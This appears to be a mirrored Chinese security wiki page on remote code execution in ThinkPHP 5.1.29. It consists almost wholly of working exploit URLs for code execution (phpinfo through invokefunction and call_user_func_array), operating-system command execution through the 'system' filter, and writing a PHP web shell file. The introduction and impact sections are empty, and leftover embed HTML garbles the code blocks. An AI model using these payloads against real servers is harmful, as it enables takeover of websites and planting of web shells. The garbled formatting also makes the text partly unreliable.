# Thinkphp 5.1.29

> 原文：[https://www.zhihuifly.com/t/topic/3158](https://www.zhihuifly.com/t/topic/3158)

# Thinkphp 5.1.29

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

### 1、代码执行

```
http://www.0-sec.org/?s=index/\think\Request/input&filter=phpinfo&data=1

<aside class="onebox whitelistedgeneric">

<header class="source">
      ![](img/663d5946d9b407a0896ad0ddbe870a7f.png)
      [0-sec.org](https://www.0-sec.org/?s=index%2F%5Cthink%5Capp%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1)
  </header>

<article class="onebox-body">

### [零组 | Zero Sec Team In security wiki](https://www.0-sec.org/?s=index%2F%5Cthink%5Capp%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1)

Zero Sec Team In security wiki

  </article>

</aside>  `<header class="source">
      ![](img/663d5946d9b407a0896ad0ddbe870a7f.png)
      [0-sec.org](https://www.0-sec.org/?s=index%2F%5Cthink%5CContainer%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1)
  </header>

<article class="onebox-body">

### [零组 | Zero Sec Team In security wiki](https://www.0-sec.org/?s=index%2F%5Cthink%5CContainer%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1)

Zero Sec Team In security wiki

  </article>` 
```

### 2、命令执行

```
 http://www.0-sec.org/?s=index/\think\Request/input&filter=system&data=操作系统命令

<aside class="onebox whitelistedgeneric">

<header class="source">
      ![](img/663d5946d9b407a0896ad0ddbe870a7f.png)
      [0-sec.org](https://www.0-sec.org/?s=index%2F%5Cthink%5Capp%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4)
  </header>

<article class="onebox-body">

### [零组 | Zero Sec Team In security wiki](https://www.0-sec.org/?s=index%2F%5Cthink%5Capp%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4)

Zero Sec Team In security wiki

  </article>

</aside>  `<header class="source">
      ![](img/663d5946d9b407a0896ad0ddbe870a7f.png)
      [0-sec.org](https://www.0-sec.org/?s=index%2F%5Cthink%5CContainer%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4)
  </header>

<article class="onebox-body">

### [零组 | Zero Sec Team In security wiki](https://www.0-sec.org/?s=index%2F%5Cthink%5CContainer%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4)

Zero Sec Team In security wiki

  </article>` 
```

### 3、文件写入

```
http://www.0-sec.org/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E  `<header class="source">
      ![](img/663d5946d9b407a0896ad0ddbe870a7f.png)
      [0-sec.org](https://www.0-sec.org/?s=index%2F%5Cthink%5Cview%5Cdriver%5CPhp%2Fdisplay&content=%3C?php%20phpinfo%28%29%3B?%3E)
  </header>

<article class="onebox-body">

### [零组 | Zero Sec Team In security wiki](https://www.0-sec.org/?s=index%2F%5Cthink%5Cview%5Cdriver%5CPhp%2Fdisplay&content=%3C?php%20phpinfo%28%29%3B?%3E)

Zero Sec Team In security wiki

  </article>` 
```